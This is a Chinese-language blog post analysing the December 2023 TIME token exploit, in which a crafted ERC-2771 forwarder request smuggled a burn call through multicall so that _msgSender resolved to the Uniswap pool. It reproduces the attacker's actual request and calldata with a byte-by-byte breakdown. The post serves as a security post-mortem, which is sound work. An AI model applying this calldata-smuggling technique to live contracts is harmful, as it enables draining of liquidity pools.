---
title: 由EIP-2771引发的血案 - TIME token 安全案例详解
date: 2024-05-31 18:57:05
tags: DeFi
mathjax: true
categories: DeFi
description: 使用 abi.encode 在多个项目中传递信息是很危险的行为
---

## EIP-2771简述

不知道大家在使用 openzepplin 轻松构建自己的 Dapp 时，有没有看到这样的代码：

```javascript
 function _msgSender() internal view virtual returns (address) {
        return msg.sender;
 }
```



初看你可能会觉得莫名其妙，msg sender 还能是什么东西？ 这东西有什么重写的必要吗？这就小看了 ethdevs 的脑洞了，在很多情况下，如果一个 Dapp 选择使用重写过的 _msgSender 做身份验证，会有很多便利和玩法，比如 [EIP-2771](https://eips.ethereum.org/EIPS/eip-2771) 就提供了一个思路，简单说来，就是为了应付某些账户没有 gas 确需要发交易的情况而生的，基本原理如下：



1. 用户 `user` 会把需要执行的**已签名交易信息**发送给 `Gas Relayer` (链下)
2.  `Gas Relayer` 调用一个叫做 `Trusted Forwarder` 的合约，合约内验证签名真伪
3.  `Trusted Forwarder`合约调用目标合约





而 EIP-2771 就会在这个过程里重新规定 msg sender 的定义。

首先在 `Trusted Forwarder `处理调用信息时，会将 `user` 的地址添加到下一次调用的 `calldata` 的最后边，而目标合约使用了被 EIP-2771 重写的 `_msgSender` 方法，若发送方是`Trusted Forwarder `，则解析出最后 20 个 bytes 作为 msg sender, 代码分别如下：

```javascript
//Trusted Forwarder     
        (bool success, bytes memory result) = req.to.call{ gas: req.gas, value: req.value }(
            abi.encodePacked(req.data, req.from)
        );
```



```javascript
// target contract
function _msgSender() internal view returns (address payable signer) {
        signer = msg.sender;
        if (msg.data.length>=20 && isTrustedForwarder(signer)) {
            assembly {
                signer := shr(96,calldataload(sub(calldatasize(),20)))
            }
        }    
    }
```

 按理来说，这样解析出来的 msgSender 就是签名的 `user` ，并没有什么不妥，但是强行读取 calldata 的动作十分危险，在 2023 年 12 月 6 日，TIME 由此出现安全事故，损失高达 18万美元。

交易链接:

https://etherscan.io/tx/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6



## 漏洞分析

我们先看其调用栈：

![](tracker.png '交易流程')

可以梳理其攻击手法：

1.先是在 uniswap 上兑换了一笔 TIME token, 

2.之后将 uniswap 的 WETH/TIME 池子中的 TIME burn 掉，得到了一个很高的 TIME 价格，

3.最后将那笔 TIME token 卖出，获得大量 WETH 完成攻击。

其中最关键的一步，“将池子的 TIME burn 掉” 是怎么做到的呢？我们主要分析第2步。

首先，用户调用了`Trusted Forwarder` 合约的 `execute` 方法()，其参数为：

```json
{
  "msg.sender":"0x6980a47bee930a4584b09ee79ebe46484fbdbdd0",
  "func":"execute",
  "args":{
    "req"		[
    {
    "from":"0xa16a5f37774309710711a8b4e83b068306b21724",
    "to":"0x4b0e9a7da8bab813efae92a6651019b8bd6c0a29",
    "value":"0",
    "gas":"5000000",
    "nonce":"0", 	"data":"0xac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf840000000000000000"
  }
  ],
"signature":"0x9194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f511b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c61b"
},
"return":{ 
  "out0":true,
  "out1":"0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000"
         }
}
```

方法代码如下：

```javascript
//Trusted Forwarder     
function execute(ForwardRequest calldata req, bytes calldata signature)
        public
        payable
        returns (bool, bytes memory)
    {
        require(verify(req, signature), "MinimalForwarder: signature does not match request");
        _nonces[req.from] = req.nonce + 1;

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory result) = req.to.call{ gas: req.gas, value: req.value }(
            abi.encodePacked(req.data, req.from)
        );

        if (!success) {
            // Next 5 lines from https://ethereum.stackexchange.com/a/83577
            if (result.length < 68) revert("Transaction reverted silently");
            assembly {
                result := add(result, 0x04)
            }
            revert(abi.decode(result, (string)));
        }
        // Check gas: https://ronan.eth.link/blog/ethereum-gas-dangers/
        assert(gasleft() > req.gas / 63);
        return (success, result);
    }
```

`req.to` 也就是目标函数是 TIME 合约

解析 `req.data`:

```
0xac9650d8
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000001
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000038
42966c68
0000000000000000000000000000000000000000c9112ec16d958e8da8180000
760dc1e043d99394a10605b2fa08f123d60faf840000000000000000
```

通过函数签名 `0xac9650d8` 可以锁定其目标是 TIME 合约的 `multicall` 方法。

```javascript
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = _functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
```

但是 `req.data` 并不是 `multicall` 接收到的 `calldata` ，因为我们会在其后边加上 `req.from` 以确认 msg sender，那么 `multicall` 收到的参数则是：

```
0xac9650d8
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000001
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000038
42966c68
0000000000000000000000000000000000000000c9112ec16d958e8da8180000
760dc1e043d99394a10605b2fa08f123d60faf840000000000000000a16a5f37774309710711a8b4e83b068306b21724
```

`multicall`的参数是 `bytes[] calldata data` ,那么其每行的意思如下

```
0xac9650d8 //multicall 的函数选择器
0000000000000000000000000000000000000000000000000000000000000020 //第一个参数也就是 data 初始位置偏移
0000000000000000000000000000000000000000000000000000000000000001 //data数组的长度
0000000000000000000000000000000000000000000000000000000000000020 //data[0]的初始位置偏移
0000000000000000000000000000000000000000000000000000000000000038 //data[0]的长度
42966c68
0000000000000000000000000000000000000000c9112ec16d958e8da8180000
760dc1e043d99394a10605b2fa08f123d60faf840000000000000000a16a5f37774309710711a8b4e83b068306b21724
```

想必大家可能隐约意识到其问题所在了，我们可以通过设定 `data[0]` 的长度让 `multicall` 忽视掉某些信息！实际上 `multicall` 收到的 `data[0]` 是 `0x42966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf84` ，而 `data` 也只有一个元素而已！



下一步`multicall` 使用调用`0x42966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf84`其自身， 匹配到了`burn`函数：



```javascript
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }
```

那么我们再次分析这个输入 `calldata`:

```
0x42966c68 //burn 的函数选择器
0000000000000000000000000000000000000000c9112ec16d958e8da8180000 //burn 的第一个参数 amount
760dc1e043d99394a10605b2fa08f123d60faf84
```

以及其`_msgSender`:

```javascript
    function _msgSender()
        internal
        view
        virtual
        override(ContextUpgradeable, ERC2771ContextUpgradeable)
        returns (address sender)
    {
        return ERC2771ContextUpgradeable._msgSender();
    }
```

也就是这个 `ERC2771ContextUpgradeable` ，把 `calldata` 的最后20字节 `0x760dc1e043d99394a10605b2fa08f123d60faf84` 返回了回去，作为 burn token 的账户，而这个 `0x760dc1e043d99394a10605b2fa08f123d60faf84` 正是 uniswap WETH/TIME 的资金池。这时，该池子里的 TIME 价格变得非常高，攻击者使用刚刚买入的 TIME 换走池子里剩下的 WETH ,完成攻击。



## 结语

这个案例的问题在于 `multicall` 并没有识别 `Trusted Forwarder` ，导致损失了 `req.from` 的信息，但是归根结底，这是过于相信拼接 `calldata` 的表达能力了，solidity 只会根据 abi 解析数据，任何拼接的参数都有一定程度的风险，我们尽量不要在跨项目的交互中过于依赖这种方法，有一个 puzzle 同样运用了该方法，留给诸君练习使用:  [abi-smuggling](https://www.damnvulnerabledefi.xyz/challenges/abi-smuggling/ ) 。